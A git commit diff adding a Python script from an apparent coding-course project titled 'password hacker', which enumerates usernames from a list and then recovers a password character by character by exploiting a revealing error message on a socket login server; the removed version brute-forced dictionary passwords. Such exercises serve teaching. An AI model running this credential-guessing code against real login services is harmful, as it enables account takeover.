9a90cb963ec482dc56c611a8371b6e7d85e07eae
Rory <rorydph@gmail.com>
2020-08-30 19:54:34 +1200

    Create 03_dict-based_brute_force.py

--- (hard) password hacker/03_dict-based_brute_force.py
+++ (hard) password hacker/03_dict-based_brute_force.py
@@ -1,32 +1,44 @@
 import itertools
+import json
 import socket
 import string
 import sys
 from pathlib import Path
 
 
-symbols = string.ascii_lowercase + string.digits
+symbols = string.ascii_letters + string.digits
 
 
-def generate_password():
-    for length in range(1, len(symbols) + 1):
-        for item in itertools.product(symbols, repeat=length):
-            yield ''.join(item)
+def send_rcv(sk, log, pwd):
+    sk.send(json.dumps({'login': log, 'password': pwd}).encode())
+    response = json.loads(sk.recv(1024).decode())
+    return response['result']
 
 
-def read_pwd_file():
-    return Path('hacking/passwords.txt').read_text().splitlines()
+def read_file(filename):
+    return Path(f'hacking/{filename}').read_text().splitlines()
+
+
+def find_login(sk):
+    for item in read_file('logins.txt'):
+        if send_rcv(sk, item, '') in ('Wrong password!', 'Exception happened during login'):
+            return item
+
+
+def find_pwd(sk, log, pwd):
+    for val in (itertools.product([pwd], symbols)):
+        attempt = ''.join(val)
+        result = send_rcv(sk, log, attempt)
+        if result == 'Exception happened during login':
+            pwd = attempt
+        elif result == 'Connection success!':
+            return attempt
+    return find_pwd(sk, log, pwd)
 
 
 args = sys.argv
 with socket.socket() as client_socket:
-    client_socket.connect((args[1], int(args[2])))
-    poss_values = read_pwd_file()
-    for value in poss_values:
-        attempts = map(''.join, itertools.product(*zip(value.upper(), value.lower())))
-        for password in attempts:
-            client_socket.send(password.encode())
-            response = client_socket.recv(1024)
-            if response.decode() == 'Connection success!':
-                print(password)
-                exit()
+    client_socket.connect((args[1].strip(), int(args[2].strip())))
+    login = find_login(client_socket)
+    password = find_pwd(client_socket, login, '')
+    print(json.dumps({"login": login, "password": password}, indent=2))
